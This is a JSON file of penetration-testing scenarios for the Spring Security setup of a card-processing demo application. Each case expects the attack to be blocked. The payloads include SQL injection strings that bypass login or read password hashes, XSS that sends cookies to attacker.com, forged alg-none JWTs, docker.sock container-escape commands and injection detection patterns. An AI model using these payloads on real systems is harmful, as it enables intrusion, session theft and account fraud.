{
  "metadata": {
    "name": "CardDemo Security Penetration Testing Scenarios",
    "version": "1.0.0",
    "description": "Comprehensive penetration testing scenarios for Spring Security implementation validation through simulated attacks, vulnerability exploitation attempts, and security control effectiveness testing",
    "created_date": "2024-07-27",
    "compliance_frameworks": [
      "OWASP Top 10 2021",
      "PCI DSS 3.2.1",
      "SOX Section 404",
      "NIST Cybersecurity Framework"
    ],
    "target_system": "CardDemo Spring Boot Microservices with JWT Authentication",
    "test_environment": "integration",
    "severity_tolerance": {
      "critical": 0,
      "high": 0,
      "medium": 5,
      "low": 20
    }
  },

  "PenetrationTestScenarios": {
    "description": "Primary export containing comprehensive security validation scenarios for Spring Security protection mechanisms",
    
    "sql_injection_attack_scenarios": {
      "description": "SQL injection vulnerability testing targeting authentication and data access endpoints",
      "severity": "CRITICAL",
      "attack_vectors": [
        {
          "scenario_name": "Authentication Bypass SQL Injection",
          "target_endpoint": "/api/auth/login",
          "http_method": "POST",
          "description": "Test SQL injection attempts in login credentials to bypass authentication controls",
          "test_payloads": [
            {
              "payload_name": "Classic SQL Injection",
              "request_body": {
                "username": "admin' OR '1'='1' --",
                "password": "password"
              },
              "expected_response": {
                "status_code": 401,
                "error_code": "AUTHENTICATION_FAILED",
                "security_behavior": "BLOCKED_BY_PREPARED_STATEMENTS"
              },
              "validation_criteria": [
                "No successful authentication",
                "Error logged in security audit",
                "No database structure exposure",
                "Standard error message returned"
              ]
            },
            {
              "payload_name": "Union-Based SQL Injection",
              "request_body": {
                "username": "test' UNION SELECT 'admin','password','A','Test','User' --",
                "password": "password"
              },
              "expected_response": {
                "status_code": 401,
                "security_behavior": "BLOCKED_BY_JPA_REPOSITORY"
              }
            },
            {
              "payload_name": "Boolean-Based Blind SQL Injection",
              "request_body": {
                "username": "admin' AND (SELECT COUNT(*) FROM users) > 0 --",
                "password": "password"
              },  
              "expected_response": {
                "status_code": 401,
                "security_behavior": "NO_INFORMATION_DISCLOSURE"
              }
            },
            {
              "payload_name": "Time-Based Blind SQL Injection",
              "request_body": {
                "username": "admin'; WAITFOR DELAY '00:00:05' --",
                "password": "password"
              },
              "expected_response": {
                "status_code": 401,
                "response_time_max": "200ms",
                "security_behavior": "NO_TIME_DELAY_EXECUTED"
              }
            }
          ]
        },
        {
          "scenario_name": "Account Data Access SQL Injection",
          "target_endpoint": "/api/account/view/{accountId}",
          "http_method": "GET",
          "authentication_required": true,
          "test_payloads": [
            {
              "payload_name": "Path Parameter SQL Injection",
              "path_parameter": "123456' OR '1'='1",
              "headers": {
                "Authorization": "Bearer valid_jwt_token"
              },
              "expected_response": {
                "status_code": 404,
                "security_behavior": "PARAMETER_VALIDATION_BLOCKED"
              }
            },
            {
              "payload_name": "Second-Order SQL Injection",
              "path_parameter": "123456'; UPDATE accounts SET balance=999999 WHERE account_id='123456",
              "expected_response": {
                "status_code": 400,
                "security_behavior": "INPUT_SANITIZATION_ACTIVE"
              }
            }
          ]
        },
        {
          "scenario_name": "User Management SQL Injection",
          "target_endpoint": "/api/users/{userId}",
          "http_method": "GET",
          "required_role": "ROLE_ADMIN",
          "test_payloads": [
            {
              "payload_name": "Admin Privilege SQL Injection",
              "path_parameter": "TESTUSER' UNION SELECT password_hash FROM users WHERE user_type='A' --",
              "headers": {
                "Authorization": "Bearer admin_jwt_token"
              },
              "expected_response": {
                "status_code": 404,
                "security_behavior": "JPA_QUERY_PROTECTION"
              }
            }
          ]
        }
      ]
    },

    "xss_vulnerability_testing": {
      "description": "Cross-Site Scripting attack simulation testing for input validation and output encoding",
      "severity": "HIGH",
      "attack_vectors": [
        {
          "scenario_name": "Reflected XSS in Authentication",
          "target_endpoint": "/api/auth/login",
          "http_method": "POST",
          "test_payloads": [
            {
              "payload_name": "Script Tag Injection",
              "request_body": {
                "username": "<script>alert('XSS_ATTACK')</script>",
                "password": "test"
              },
              "expected_response": {
                "status_code": 401,
                "response_validation": [
                  "No script execution in response",
                  "Input sanitized in error messages",
                  "Content-Type: application/json enforced"
                ]
              }
            },
            {
              "payload_name": "HTML Entity Injection",
              "request_body": {
                "username": "<img src=x onerror=alert('XSS')>",
                "password": "test"
              },
              "expected_response": {
                "status_code": 401,
                "security_behavior": "HTML_ENTITIES_ENCODED"
              }
            },
            {
              "payload_name": "JavaScript URL Injection",
              "request_body": {
                "username": "javascript:alert('XSS')",
                "password": "test"
              },
              "expected_response": {
                "status_code": 401,
                "security_behavior": "URL_VALIDATION_BLOCKED"
              }
            }
          ]
        },
        {
          "scenario_name": "Stored XSS via User Profile",
          "target_endpoint": "/api/users",
          "http_method": "POST",
          "required_role": "ROLE_ADMIN",
          "test_payloads": [
            {
              "payload_name": "Persistent Script Storage",
              "request_body": {
                "userId": "TESTUSER",
                "firstName": "<script>document.location='http://attacker.com/'+document.cookie</script>",
                "lastName": "Test",
                "userType": "U"
              },
              "expected_response": {
                "status_code": 400,
                "security_behavior": "INPUT_VALIDATION_REJECTED"
              }
            }
          ]
        }
      ]
    },

    "csrf_attack_simulation": {
      "description": "Cross-Site Request Forgery attack testing to validate CSRF protection mechanisms",
      "severity": "HIGH",
      "attack_vectors": [
        {
          "scenario_name": "CSRF Token Bypass Attempts",
          "target_endpoint": "/api/account/update/123456",
          "http_method": "PUT",
          "authentication_required": true,
          "test_payloads": [
            {
              "payload_name": "Missing CSRF Token",
              "headers": {
                "Authorization": "Bearer valid_jwt_token",
                "Content-Type": "application/json"
              },
              "request_body": {
                "accountBalance": "999999.99"
              },
              "expected_response": {
                "status_code": 403,
                "error_code": "CSRF_TOKEN_INVALID",
                "security_behavior": "CSRF_PROTECTION_ACTIVE"
              }
            },
            {
              "payload_name": "Invalid CSRF Token",
              "headers": {
                "Authorization": "Bearer valid_jwt_token",
                "X-XSRF-TOKEN": "invalid_csrf_token_12345",
                "Content-Type": "application/json"
              },
              "request_body": {
                "accountBalance": "999999.99"
              },
              "expected_response": {
                "status_code": 403,
                "error_code": "CSRF_TOKEN_INVALID"
              }
            },
            {
              "payload_name": "CSRF Token Reuse Attack",
              "headers": {
                "Authorization": "Bearer valid_jwt_token",
                "X-XSRF-TOKEN": "previously_used_csrf_token",
                "Content-Type": "application/json"
              },
              "request_body": {
                "accountBalance": "999999.99"
              },
              "expected_response": {
                "status_code": 403,
                "security_behavior": "TOKEN_REPLAY_PROTECTION"
              }
            }
          ]
        },
        {
          "scenario_name": "Cross-Origin CSRF Attacks",
          "target_endpoint": "/api/transaction/add",
          "http_method": "POST",
          "test_payloads": [
            {
              "payload_name": "Malicious Origin Request",
              "headers": {
                "Authorization": "Bearer valid_jwt_token",
                "Origin": "https://malicious-site.com",
                "Content-Type": "application/json"
              },
              "request_body": {
                "accountId": "123456789",
                "amount": "1000000.00",
                "transactionType": "DEBIT"
              },
              "expected_response": {
                "status_code": 403,
                "security_behavior": "CORS_PROTECTION_BLOCKED"
              }
            }
          ]
        }
      ]
    },

    "authentication_bypass_attempts": {
      "description": "Authentication bypass testing through various attack vectors and token manipulation",
      "severity": "CRITICAL",
      "attack_vectors": [
        {
          "scenario_name": "JWT Token Manipulation",
          "target_endpoint": "/api/account/view/123456",
          "http_method": "GET",
          "test_payloads": [
            {
              "payload_name": "Algorithm Confusion Attack",
              "headers": {
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIn0."
              },
              "description": "Attempt to bypass signature verification by setting algorithm to 'none'",
              "expected_response": {
                "status_code": 401,
                "error_code": "JWT_TOKEN_INVALID",
                "security_behavior": "ALGORITHM_VALIDATION_ENFORCED"
              }
            },
            {
              "payload_name": "Signature Bypass Attempt",
              "headers": {
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIiwiaWF0IjoxNzIyMTA0NDAwLCJleHAiOjk5OTk5OTk5OTl9.TAMPERED_SIGNATURE"
              },
              "description": "Tamper with JWT signature to test signature validation",
              "expected_response": {
                "status_code": 401,
                "security_behavior": "SIGNATURE_VALIDATION_FAILED"
              }
            },
            {
              "payload_name": "Claims Manipulation",
              "headers": {
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIiwiaWF0IjoxNzIyMTA0NDAwLCJleHAiOjk5OTk5OTk5OTl9.invalid_signature_for_modified_claims"
              },
              "description": "Attempt to escalate privileges by modifying user type claim",
              "expected_response": {
                "status_code": 401,
                "security_behavior": "SIGNATURE_MISMATCH_DETECTED"
              }
            },
            {
              "payload_name": "Expired Token Usage",
              "headers": {
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiVSIsInJvbGUiOiJST0xFX1VTRVIiLCJpYXQiOjE3MDUzMTI4MDAsImV4cCI6MTcwNTMxNDYwMH0.expired_token_signature"
              },
              "description": "Test expired token rejection",
              "expected_response": {
                "status_code": 401,
                "error_code": "JWT_TOKEN_EXPIRED",
                "security_behavior": "EXPIRATION_VALIDATION_ACTIVE"
              }
            }
          ]
        },
        {
          "scenario_name": "Authorization Header Bypass",
          "target_endpoint": "/api/users",
          "http_method": "GET",
          "required_role": "ROLE_ADMIN",
          "test_payloads": [
            {
              "payload_name": "Missing Authorization Header",
              "headers": {},
              "expected_response": {
                "status_code": 401,
                "error_code": "JWT_TOKEN_MISSING",
                "security_behavior": "AUTHORIZATION_HEADER_REQUIRED"
              }
            },
            {
              "payload_name": "Invalid Bearer Format",
              "headers": {
                "Authorization": "InvalidPrefix eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
              },
              "expected_response": {
                "status_code": 401,
                "security_behavior": "BEARER_FORMAT_VALIDATION"
              }
            },
            {
              "payload_name": "Empty Bearer Token",
              "headers": {
                "Authorization": "Bearer "
              },
              "expected_response": {
                "status_code": 401,
                "security_behavior": "EMPTY_TOKEN_REJECTED"
              }
            }
          ]
        }
      ]
    },

    "session_hijacking_scenarios": {
      "description": "Session management security testing including token theft and session fixation attacks",
      "severity": "HIGH",
      "attack_vectors": [
        {
          "scenario_name": "JWT Token Theft Simulation",
          "test_payloads": [
            {
              "payload_name": "Token Replay Attack",
              "description": "Test if stolen JWT tokens can be reused from different IP addresses",
              "attack_flow": [
                {
                  "step": 1,
                  "action": "Legitimate user login",
                  "endpoint": "/api/auth/login",
                  "source_ip": "192.168.1.100"
                },
                {
                  "step": 2,
                  "action": "Token reuse from different IP",
                  "endpoint": "/api/account/view/123456",
                  "source_ip": "10.0.0.50",
                  "headers": {
                    "Authorization": "Bearer captured_jwt_token",
                    "X-Forwarded-For": "10.0.0.50"
                  }
                }
              ],
              "expected_behavior": {
                "security_monitoring": "IP_CHANGE_DETECTED",
                "response_action": "SECURITY_ALERT_GENERATED",
                "access_result": "CONDITIONAL_ACCESS_BASED_ON_POLICY"
              }
            }
          ]
        },
        {
          "scenario_name": "Session Fixation Attacks",
          "test_payloads": [
            {
              "payload_name": "Pre-Authentication Session Fixation",
              "description": "Test session management security during authentication flow",
              "attack_flow": [
                {
                  "step": 1,
                  "action": "Obtain session identifier",
                  "endpoint": "/api/auth/login",
                  "method": "GET"
                },
                {
                  "step": 2,
                  "action": "Force victim to use fixed session",
                  "endpoint": "/api/auth/login",
                  "method": "POST",
                  "request_body": {
                    "username": "TESTUSER",
                    "password": "password123"
                  },
                  "headers": {
                    "X-Session-ID": "attacker_controlled_session_id"
                  }
                }
              ],
              "expected_response": {
                "status_code": 200,
                "security_behavior": "NEW_SESSION_ID_GENERATED",
                "validation": "SESSION_ID_REGENERATION_ON_AUTH"
              }
            }
          ]
        }
      ]
    },

    "jwt_token_manipulation_tests": {
      "description": "Comprehensive JWT token security testing including cryptographic attacks and claim validation",
      "severity": "CRITICAL", 
      "attack_vectors": [
        {
          "scenario_name": "JWT Algorithm Attacks",
          "test_payloads": [
            {
              "payload_name": "RS256 to HS256 Algorithm Confusion",
              "description": "Attempt to exploit algorithm confusion vulnerability",
              "malicious_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIiwiaWF0IjoxNzIyMTA0NDAwLCJleHAiOjk5OTk5OTk5OTl9.public_key_as_hmac_secret",
              "target_endpoint": "/api/users",
              "expected_response": {
                "status_code": 401,
                "security_behavior": "ALGORITHM_VERIFICATION_ENFORCED"
              }
            },
            {
              "payload_name": "None Algorithm Bypass",
              "description": "Test unsigned JWT token acceptance",
              "malicious_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIn0.",
              "target_endpoint": "/api/admin/dashboard",
              "expected_response": {
                "status_code": 401,
                "security_behavior": "UNSIGNED_TOKEN_REJECTED"
              }
            }
          ]
        },
        {
          "scenario_name": "JWT Claim Manipulation",
          "test_payloads": [
            {
              "payload_name": "User Type Privilege Escalation",
              "description": "Attempt to change user type from 'U' to 'A' in JWT claims",
              "original_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiVSIsInJvbGUiOiJST0xFX1VTRVIifQ.original_signature",
              "tampered_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJURVNUVVNFUiIsInVzZXJUeXBlIjoiQSIsInJvbGUiOiJST0xFX0FETUlOIn0.tampered_signature",
              "target_endpoint": "/api/users",
              "expected_response": {
                "status_code": 401,
                "security_behavior": "SIGNATURE_VALIDATION_FAILED"
              }
            },
            {
              "payload_name": "Expiration Time Extension",
              "description": "Attempt to extend token expiration time",
              "tampered_claims": {
                "sub": "TESTUSER",
                "userType": "U", 
                "role": "ROLE_USER",
                "exp": 9999999999
              },
              "expected_response": {
                "status_code": 401,
                "security_behavior": "SIGNATURE_MISMATCH_FOR_MODIFIED_EXP"
              }
            }
          ]
        }
      ]
    },

    "authorization_boundary_testing": {
      "description": "Role-based access control testing and privilege escalation prevention",
      "severity": "HIGH",
      "attack_vectors": [
        {
          "scenario_name": "Horizontal Privilege Escalation",
          "test_payloads": [
            {
              "payload_name": "Cross-User Account Access",
              "description": "User A attempting to access User B's account data",
              "authenticated_user": {
                "userId": "TESTUSER1",
                "userType": "U",
                "role": "ROLE_USER"
              },
              "target_endpoint": "/api/account/view/987654321",
              "target_resource_owner": "TESTUSER2",
              "expected_response": {
                "status_code": 403,
                "error_code": "INSUFFICIENT_PRIVILEGES",
                "security_behavior": "RESOURCE_OWNER_VALIDATION"
              }
            }
          ]
        },
        {
          "scenario_name": "Vertical Privilege Escalation",
          "test_payloads": [
            {
              "payload_name": "Regular User Admin Access",
              "description": "Regular user attempting to access admin-only endpoints",
              "authenticated_user": {
                "userId": "TESTUSER",
                "userType": "U",
                "role": "ROLE_USER"
              },
              "target_endpoints": [
                "/api/users",
                "/api/users/TESTADMIN",
                "/api/admin/dashboard",
                "/actuator/metrics"
              ],
              "expected_response": {
                "status_code": 403,
                "security_behavior": "ROLE_BASED_ACCESS_DENIED"
              }
            },
            {
              "payload_name": "HTTP Method Privilege Escalation",
              "description": "Attempt privileged operations through different HTTP methods",
              "authenticated_user": {
                "userId": "TESTUSER",
                "userType": "U",
                "role": "ROLE_USER"
              },
              "test_cases": [
                {
                  "endpoint": "/api/users/TESTUSER",
                  "method": "DELETE",
                  "user_role": "ROLE_USER",
                  "expected_status": 403
                },
                {
                  "endpoint": "/api/account/123456",
                  "method": "PUT", 
                  "user_role": "ROLE_USER",
                  "expected_behavior": "CONDITIONAL_ACCESS_WITH_OWNERSHIP_CHECK"
                }
              ],
              "expected_response": {
                "status_code": 403,
                "security_behavior": "HTTP_METHOD_ACCESS_DENIED"
              }
            }
          ]
        }
      ]
    },

    "container_security_validation": {
      "description": "Cloud-native container security testing for Docker and Kubernetes environments",
      "severity": "MEDIUM",
      "attack_vectors": [
        {
          "scenario_name": "Container Escape Attempts",
          "test_payloads": [
            {
              "payload_name": "Docker Socket Access",
              "description": "Test for unauthorized Docker daemon access",
              "test_commands": [
                "curl --unix-socket /var/run/docker.sock http://localhost/version",
                "docker ps",
                "docker exec -it container_id /bin/bash"
              ],
              "expected_behavior": {
                "access_result": "ACCESS_DENIED",
                "security_control": "DOCKER_SOCKET_NOT_MOUNTED"
              }
            },
            {
              "payload_name": "Privileged Container Detection",
              "description": "Verify containers run with minimal privileges",
              "validation_checks": [
                "USER_NOT_ROOT",
                "NO_PRIVILEGED_MODE",
                "READ_ONLY_FILESYSTEM_WHERE_POSSIBLE",
                "CAPABILITIES_DROPPED"
              ]
            }
          ]
        },
        {
          "scenario_name": "Container Image Vulnerabilities",
          "test_payloads": [
            {
              "payload_name": "Base Image Security Scan",
              "description": "Validate base images have no critical vulnerabilities",
              "scan_targets": [
                "openjdk:21-jre-slim",
                "postgres:15-alpine",
                "redis:7-alpine"
              ],
              "acceptance_criteria": {
                "critical_vulnerabilities": 0,
                "high_vulnerabilities": 0,
                "vulnerability_database": "CVE_DATABASE_CURRENT"
              }
            }
          ]
        }
      ]
    },

    "kubernetes_rbac_testing": {
      "description": "Kubernetes Role-Based Access Control security validation",
      "severity": "MEDIUM",
      "attack_vectors": [
        {
          "scenario_name": "Pod Security Policy Validation",
          "test_payloads": [
            {
              "payload_name": "Privileged Pod Creation Attempt",
              "description": "Test prevention of privileged pod deployment",
              "pod_manifest": {
                "apiVersion": "v1",
                "kind": "Pod",
                "spec": {
                  "securityContext": {
                    "privileged": true
                  }
                }
              },
              "expected_response": {
                "admission_result": "DENIED",
                "security_policy": "PRIVILEGED_PODS_BLOCKED"
              }
            },
            {
              "payload_name": "Host Network Access Attempt",
              "description": "Test prevention of host network access",
              "pod_manifest": {
                "spec": {
                  "hostNetwork": true,
                  "hostPID": true
                }
              },
              "expected_response": {
                "admission_result": "DENIED",
                "security_policy": "HOST_ACCESS_RESTRICTED"
              }
            }
          ]
        },
        {
          "scenario_name": "Service Account Permission Testing",
          "test_payloads": [
            {
              "payload_name": "Default Service Account Restrictions",
              "description": "Verify default service accounts have minimal permissions",
              "kubernetes_api_tests": [
                {
                  "action": "list_secrets",
                  "namespace": "default",
                  "expected_result": "FORBIDDEN"
                },
                {
                  "action": "create_pods",
                  "namespace": "default", 
                  "expected_result": "FORBIDDEN"
                }
              ]
            }
          ]
        }
      ]
    }
  },

  "SecurityTestConfiguration": {
    "description": "Configuration settings for automated penetration test execution and security scanning integration",
    
    "owasp_zap_integration_settings": {
      "zap_proxy_host": "localhost",
      "zap_proxy_port": 8080,
      "api_key": "${ZAP_API_KEY}",
      "scan_policies": [
        "SQL-Injection",
        "Cross-Site-Scripting",
        "Path-Traversal",
        "Command-Injection",
        "Authentication-Testing"
      ],
      "scan_timeout": "3600s",
      "report_format": "json"
    },

    "vulnerability_assessment_profiles": {
      "critical_severity_profile": {
        "enabled": true,
        "test_categories": [
          "sql_injection_attack_scenarios",
          "authentication_bypass_attempts",
          "jwt_token_manipulation_tests"
        ],
        "failure_threshold": 0,
        "immediate_alert": true
      },
      "high_severity_profile": {
        "enabled": true,
        "test_categories": [
          "xss_vulnerability_testing",
          "csrf_attack_simulation",
          "session_hijacking_scenarios",
          "authorization_boundary_testing"
        ],
        "failure_threshold": 0,
        "alert_delay": "15m"
      },
      "medium_severity_profile": {
        "enabled": true,
        "test_categories": [
          "container_security_validation",
          "kubernetes_rbac_testing"
        ],
        "failure_threshold": 5,
        "alert_delay": "1h"
      }
    },

    "attack_vector_definitions": {
      "authentication_attacks": {
        "brute_force_protection": {
          "max_attempts": 5,
          "lockout_duration": "15m",
          "rate_limit": "10/min"
        },
        "credential_stuffing": {
          "detection_threshold": "100_failed_attempts/hour",
          "response_action": "IP_BLOCK_24H"
        }
      },
      "injection_attacks": {
        "sql_injection": {
          "detection_patterns": [
            "UNION SELECT",
            "OR 1=1",
            "'; DROP TABLE",
            "WAITFOR DELAY"
          ],
          "response_action": "REQUEST_BLOCKED_AND_LOGGED"
        },
        "command_injection": {
          "detection_patterns": [
            "|", "&&", ";", "$(",
            "eval(", "exec("
          ]
        }
      }
    },

    "security_control_validation": {
      "spring_security_controls": [
        {
          "control_name": "JWT_AUTHENTICATION",
          "validation_method": "TOKEN_SIGNATURE_VERIFICATION",
          "test_scenarios": ["jwt_token_manipulation_tests"]
        },
        {
          "control_name": "CSRF_PROTECTION", 
          "validation_method": "DOUBLE_SUBMIT_COOKIE_PATTERN",
          "test_scenarios": ["csrf_attack_simulation"]
        },
        {
          "control_name": "INPUT_VALIDATION",
          "validation_method": "JAKARTA_BEAN_VALIDATION",
          "test_scenarios": ["sql_injection_attack_scenarios", "xss_vulnerability_testing"]
        },
        {
          "control_name": "AUTHORIZATION",
          "validation_method": "ROLE_BASED_ACCESS_CONTROL",
          "test_scenarios": ["authorization_boundary_testing"]
        }
      ]
    },

    "compliance_testing_scenarios": {
      "pci_dss_validation": {
        "requirement_3": {
          "test_name": "Cardholder Data Protection",
          "validation_scenarios": [
            "CARD_NUMBER_MASKING_IN_RESPONSES",
            "ENCRYPTION_AT_REST_VERIFICATION",
            "ENCRYPTION_IN_TRANSIT_VERIFICATION"
          ]
        },
        "requirement_8": {
          "test_name": "Strong Authentication",
          "validation_scenarios": [
            "PASSWORD_COMPLEXITY_ENFORCEMENT",
            "JWT_TOKEN_STRENGTH_VALIDATION",
            "MULTI_FACTOR_AUTHENTICATION_READINESS"
          ]
        }
      }
    },

    "automated_penetration_test_execution": {
      "test_scheduling": {
        "daily_security_scan": {
          "time": "02:00",
          "test_categories": [
            "sql_injection_attack_scenarios",
            "xss_vulnerability_testing"
          ],
          "duration_limit": "30m"
        },
        "weekly_comprehensive_scan": {
          "day": "Sunday",
          "time": "01:00", 
          "test_categories": "ALL",
          "duration_limit": "2h"
        }
      },
      "reporting": {
        "formats": ["json", "html", "pdf"],
        "recipients": [
          "security-team@carddemo.com",
          "devops-team@carddemo.com"
        ],
        "severity_filters": {
          "immediate_notification": ["CRITICAL", "HIGH"],
          "daily_summary": ["MEDIUM", "LOW"]
        }  
      }
    },

    "security_scanning_parameters": {
      "scan_depth": "COMPREHENSIVE",
      "scan_intensity": "HIGH",
      "false_positive_filtering": true,
      "custom_payloads": true,
      "session_management": "JWT_AWARE",
      "authentication_handling": "BEARER_TOKEN_SUPPORT"
    }
  }
}